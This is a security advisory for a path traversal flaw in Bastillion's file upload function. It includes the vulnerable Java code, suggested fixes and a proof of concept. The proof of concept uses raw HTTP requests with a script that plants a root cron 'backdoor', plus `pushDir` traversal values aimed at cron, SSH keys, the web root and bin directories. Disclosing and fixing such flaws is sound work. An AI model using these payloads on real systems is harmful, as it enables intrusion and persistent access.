# Bastillion Path Traversal Vulnerability in File Upload Function

## NAME OF AFFECTED PRODUCT(S)

- Product: Bastillion
- Vendor: bastillion-io
- Vendor Homepage: https://www.bastillion.io/
- Software Link: https://github.com/bastillion-io/Bastillion

## AFFECTED AND/OR FIXED VERSION(S)

- Affected Version: 4.00.00-SNAPSHOT and earlier versions
- Fixed Version: Not yet fixed

## SUBMITTER

s1ain

## PROBLEM TYPE

Path Traversal / Directory Traversal

## VULNERABILITY TYPE

CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

## ROOT CAUSE

The application fails to properly validate and sanitize user-controlled directory paths in the file upload functionality. The `pushDir` parameter, which specifies the destination directory on remote SSH servers, only performs minimal filtering by removing tilde (`~`) characters. This insufficient validation allows attackers to use path traversal sequences (e.g., `../`) to upload files outside of the intended directory.

## IMPACT

An authenticated attacker with file upload permissions can:
- Upload files to arbitrary locations on managed remote SSH servers
- Overwrite critical system files
- Upload malicious files to sensitive directories such as `/etc/cron.d/` for scheduled task execution
- Potentially add SSH keys to `~/.ssh/authorized_keys` for persistent access
- Execute arbitrary code by uploading files to executable directories

## DESCRIPTION

Bastillion is a web-based SSH console that centrally manages administrative access to systems. It provides features for SSH key management and remote file distribution.

A path traversal vulnerability exists in the file upload functionality where the `pushDir` parameter can be manipulated to specify arbitrary directory paths on remote servers. The application only removes tilde characters from the path but does not validate or sanitize path traversal sequences.

### Authorization Requirements

To exploit this vulnerability, an attacker must:
1. Have valid credentials to authenticate to the Bastillion application
2. Possess file upload permissions within the system
3. Have access to at least one configured remote system

### Affected Components

**File: `src/main/java/io/bastillion/manage/util/SSHUtil.java`**

Line 230-248:
```java
public static HostSystem pushUpload(HostSystem hostSystem, Session session, String source, String destination) {
    hostSystem.setStatusCd(HostSystem.SUCCESS_STATUS);
    Channel channel = null;
    ChannelSftp c = null;
    try (FileInputStream file = new FileInputStream(source)) {
        channel = session.openChannel("sftp");
        channel.connect(CHANNEL_TIMEOUT);
        c = (ChannelSftp) channel;
        destination = destination.replaceAll("~\\/|~", "");  // Insufficient filtering
        c.put(file, destination);
    } catch (Exception ex) {
        log.info(ex.toString(), ex);
        hostSystem.setErrorMsg(ex.getMessage());
        hostSystem.setStatusCd(HostSystem.GENERIC_FAIL_STATUS);
    }
    if (c != null) c.exit();
    if (channel != null) channel.disconnect();
    return hostSystem;
}
```

**File: `src/main/java/io/bastillion/manage/control/UploadAndPushKtrl.java`**

Line 76-129:
```java
@Kontrol(path = "/admin/uploadSubmit", method = MethodType.POST)
public String uploadSubmit() {
    String retVal = "/admin/upload_result.html";

    try {
        Long userId = AuthUtil.getUserId(getRequest().getSession());

        DiskFileItemFactory factory = DiskFileItemFactory.builder().get();
        JakartaServletFileUpload uploadHandler = new JakartaServletFileUpload(factory);

        List<FileItem> items = uploadHandler.parseRequest(getRequest());

        for (FileItem item : items) {
            if (!item.isFormField()) {
                uploadFileName = new File(item.getName()).getName();

                File path = new File(UPLOAD_PATH);
                if (!path.exists() && !path.mkdirs()) {
                    throw new IOException("Failed to create upload directory: " + path);
                }

                upload = new File(path, uploadFileName);

                try (var input = item.getInputStream()) {
                    java.nio.file.Files.copy(
                            input,
                            upload.toPath(),
                            java.nio.file.StandardCopyOption.REPLACE_EXISTING
                    );
                }
            } else {
                pushDir = item.getString();  // User-controlled, insufficiently validated
            }
        }

        pendingSystemStatus = SystemStatusDB.getNextPendingSystem(userId);
        hostSystemList = SystemStatusDB.getAllSystemStatus(userId);

    } catch (Exception ex) {
        log.error("Upload failed", ex);
        retVal = "/admin/upload.html";
    }

    getRequest().getSession().setAttribute(SecurityFilter._CSRF,
            getRequest().getParameter(SecurityFilter._CSRF));

    return retVal;
}

@Kontrol(path = "/admin/push", method = MethodType.POST)
public String push() throws ServletException {
    try {
        Long userId = AuthUtil.getUserId(getRequest().getSession());
        Long sessionId = AuthUtil.getSessionId(getRequest().getSession());

        pendingSystemStatus = SystemStatusDB.getNextPendingSystem(userId);
        if (pendingSystemStatus != null) {
            SchSession session = null;
            for (Integer instanceId : SecureShellKtrl.getUserSchSessionMap().get(sessionId).getSchSessionMap().keySet()) {
                if (pendingSystemStatus.getId().equals(SecureShellKtrl.getUserSchSessionMap().get(sessionId).getSchSessionMap().get(instanceId).getHostSystem().getId())) {
                    session = SecureShellKtrl.getUserSchSessionMap().get(sessionId).getSchSessionMap().get(instanceId);
                }
            }

            if (session != null) {
                // Vulnerable call - pushDir is user-controlled
                currentSystemStatus = SSHUtil.pushUpload(pendingSystemStatus, session.getSession(),
                    UPLOAD_PATH + "/" + uploadFileName,
                    pushDir + "/" + uploadFileName);

                SystemStatusDB.updateSystemStatus(currentSystemStatus, userId);
                pendingSystemStatus = SystemStatusDB.getNextPendingSystem(userId);
            }
        }

        if (pendingSystemStatus == null) {
            File delFile = new File(UPLOAD_PATH, uploadFileName);
            FileUtils.deleteQuietly(delFile);

            File delDir = new File(UPLOAD_PATH);
            if (delDir.isDirectory()) {
                Calendar expireTime = Calendar.getInstance();
                expireTime.add(Calendar.HOUR, -48);

                Iterator<File> filesToDelete = FileUtils.iterateFiles(delDir, new AgeFileFilter(expireTime.getTime()), TrueFileFilter.TRUE);
                while (filesToDelete.hasNext()) {
                    delFile = filesToDelete.next();
                    delFile.delete();
                }
            }
        }
        hostSystemList = SystemStatusDB.getAllSystemStatus(userId);

    } catch (SQLException | GeneralSecurityException ex) {
        log.error(ex.toString(), ex);
        throw new ServletException(ex.toString(), ex);
    }

    getRequest().getSession().setAttribute(SecurityFilter._CSRF,
            getRequest().getParameter(SecurityFilter._CSRF));

    return "/admin/upload_result.html";
}
```

### Vulnerability Details and Proof of Concept

#### Attack Flow

1. Attacker authenticates to Bastillion with valid credentials
2. Navigates to the file upload interface at `/admin/setUpload`
3. Selects target systems to upload files to
4. Uploads a malicious file (e.g., a cron job or executable script)
5. Intercepts the upload request and modifies the `pushDir` parameter to include path traversal sequences
6. The file is uploaded to an arbitrary location on all selected remote servers

#### Proof of Concept

**Step 1: Access the upload interface**
```
GET /admin/setUpload?idList=1,2,3 HTTP/1.1
Host: bastillion.example.com
Cookie: [authenticated session cookie]
```

**Step 2: Upload file with path traversal payload**
```
POST /admin/uploadSubmit HTTP/1.1
Host: bastillion.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Cookie: [authenticated session cookie]

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="malicious.sh"
Content-Type: application/x-sh

#!/bin/bash
# Malicious payload
echo "* * * * * root /tmp/backdoor.sh" > /etc/cron.d/backdoor

------WebKitFormBoundary
Content-Disposition: form-data; name="pushDir"

../../etc/cron.d
------WebKitFormBoundary--
```

**Step 3: Trigger file distribution**
```
POST /admin/push HTTP/1.1
Host: bastillion.example.com
Cookie: [authenticated session cookie]
```

#### Additional Attack Scenarios

**Scenario 1: Upload to cron directory for code execution**
```
pushDir=../../etc/cron.d
```
Result: Uploaded file is placed in `/etc/cron.d/`, potentially executing as root

**Scenario 2: Overwrite SSH authorized_keys**
```
pushDir=../../.ssh
```
Result: If the file is named `authorized_keys`, it could replace the existing authorized keys file

**Scenario 3: Upload to web root**
```
pushDir=../../../../var/www/html
```
Result: Web shell can be uploaded and accessed via HTTP

**Scenario 4: Upload to system binary directory**
```
pushDir=../../usr/local/bin
```
Result: Malicious executables can be placed in PATH

### Attack Results

Successful exploitation can result in:
- **Remote Code Execution**: Files uploaded to `/etc/cron.d/` execute with root privileges
- **Persistent Access**: SSH keys added to `~/.ssh/authorized_keys` provide backdoor access
- **Data Breach**: Access to sensitive files and directories on managed systems
- **Lateral Movement**: Compromise of multiple managed systems simultaneously
- **Privilege Escalation**: Execution with the privileges of the SSH user (often root)

### Impact Assessment

**Severity**: Medium to High (CVSS 6.5-7.5)

**CVSS Vector**: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: High (authenticated user with upload permissions)
- User Interaction: None
- Scope: Unchanged
- Confidentiality Impact: High
- Integrity Impact: High
- Availability Impact: High

**Real-world Impact**:
- In environments where Bastillion manages critical infrastructure, this vulnerability could lead to complete compromise of the managed systems
- The vulnerability affects all remote systems managed by the Bastillion instance
- The multi-system impact amplifies the severity

## SUGGESTED REPAIR

### Immediate Remediation

**Option 1: Implement strict path validation (Recommended)**

Modify `SSHUtil.pushUpload()` to validate and sanitize the destination path:

```java
private static String sanitizeUploadPath(String path) throws IllegalArgumentException {
    // Remove any path traversal sequences
    path = path.replaceAll("\\.\\.", "");
    path = path.replaceAll("~", "");

    // Reject absolute paths
    if (path.startsWith("/")) {
        throw new IllegalArgumentException("Absolute paths are not allowed");
    }

    // Normalize the path
    Path normalized = Paths.get(path).normalize();

    // Ensure the path doesn't escape the intended directory
    if (normalized.startsWith("..")) {
        throw new IllegalArgumentException("Path traversal detected");
    }

    // Ensure no null bytes
    if (path.contains("\0")) {
        throw new IllegalArgumentException("Invalid path characters");
    }

    return normalized.toString();
}

public static HostSystem pushUpload(HostSystem hostSystem, Session session, String source, String destination) {
    hostSystem.setStatusCd(HostSystem.SUCCESS_STATUS);
    Channel channel = null;
    ChannelSftp c = null;
    try (FileInputStream file = new FileInputStream(source)) {
        channel = session.openChannel("sftp");
        channel.connect(CHANNEL_TIMEOUT);
        c = (ChannelSftp) channel;

        // Sanitize the destination path
        destination = sanitizeUploadPath(destination);

        c.put(file, destination);
    } catch (IllegalArgumentException ex) {
        log.error("Invalid upload path: " + ex.getMessage());
        hostSystem.setErrorMsg("Invalid destination path");
        hostSystem.setStatusCd(HostSystem.GENERIC_FAIL_STATUS);
    } catch (Exception ex) {
        log.info(ex.toString(), ex);
        hostSystem.setErrorMsg(ex.getMessage());
        hostSystem.setStatusCd(HostSystem.GENERIC_FAIL_STATUS);
    }
    if (c != null) c.exit();
    if (channel != null) channel.disconnect();
    return hostSystem;
}
```

**Option 2: Use whitelist-based validation**

Restrict uploads to predefined allowed directories:

```java
private static final Set<String> ALLOWED_UPLOAD_DIRECTORIES = Set.of(
    "uploads",
    "documents",
    "tmp",
    "shared"
);

private static String validateUploadDirectory(String pushDir) throws IllegalArgumentException {
    // Extract the base directory
    String baseDir = pushDir.split("/")[0];

    if (!ALLOWED_UPLOAD_DIRECTORIES.contains(baseDir)) {
        throw new IllegalArgumentException("Upload directory not in whitelist: " + baseDir);
    }

    // Still sanitize the full path
    return sanitizeUploadPath(pushDir);
}
```

**Option 3: Configure per-system upload directories**

Store allowed upload paths in the database per system configuration:

```java
// In HostSystem model, add:
private String allowedUploadPath;

// In SSHUtil.pushUpload(), validate against the configured path:
if (!destination.startsWith(hostSystem.getAllowedUploadPath())) {
    throw new IllegalArgumentException("Upload path not allowed for this system");
}
```

### Additional Security Measures

1. **Input Validation**: Add comprehensive input validation in `UploadAndPushKtrl.uploadSubmit()`:
```java
} else {
    String rawPushDir = item.getString();

    // Validate pushDir before setting
    if (rawPushDir.contains("..") || rawPushDir.contains("~") || rawPushDir.startsWith("/")) {
        throw new IllegalArgumentException("Invalid upload directory specified");
    }

    pushDir = rawPushDir;
}
```

2. **Logging and Monitoring**: Add audit logging for all file upload attempts:
```java
log.info("File upload attempt - User: {}, File: {}, Destination: {}, System: {}",
    userId, uploadFileName, pushDir, pendingSystemStatus.getDisplayNm());
```

3. **Permission Checks**: Ensure SFTP operations run with minimal required privileges

4. **Configuration Option**: Add a configuration flag to disable custom upload paths:
```properties
# BastillionConfig.properties
allowCustomUploadPaths=false
defaultUploadPath=uploads
```

### Testing Recommendations

After implementing fixes, verify:
1. Legitimate uploads to allowed directories continue to work
2. Path traversal attempts (`../`, `../../`, etc.) are rejected
3. Absolute paths are rejected
4. Tilde expansion attempts are blocked
5. Null byte injection is prevented
6. Error messages don't leak sensitive path information

### Timeline for Remediation

- **Immediate**: Disable file upload functionality or restrict to trusted administrators only
- **Short-term (1-2 weeks)**: Implement path validation and sanitization
- **Long-term (1-3 months)**: Implement whitelist-based directory restrictions and comprehensive audit logging

## REFERENCES

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
  https://cwe.mitre.org/data/definitions/22.html

- OWASP Path Traversal
  https://owasp.org/www-community/attacks/Path_Traversal

- Bastillion GitHub Repository
  https://github.com/bastillion-io/Bastillion
